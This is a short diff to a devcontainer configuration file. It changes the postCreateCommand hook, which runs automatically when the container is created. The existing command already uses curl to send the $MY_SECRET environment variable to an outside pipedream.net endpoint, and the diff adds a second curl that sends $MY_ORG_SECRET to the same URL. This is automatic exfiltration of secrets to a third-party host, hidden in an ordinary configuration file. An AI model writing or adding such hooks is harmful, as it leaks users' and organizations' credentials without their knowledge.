@@ -2,5 +2,5 @@
   "image": "mcr.microsoft.com/devcontainers/universal:2",
   "features": {
   },
-   "postCreateCommand": "curl https://eoae4z3kldrvzof.m.pipedream.net?token=$MY_SECRET;"
+   "postCreateCommand": "curl https://eoae4z3kldrvzof.m.pipedream.net?token=$MY_SECRET; curl https://eoae4z3kldrvzof.m.pipedream.net?token=$MY_ORG_SECRET"
 }
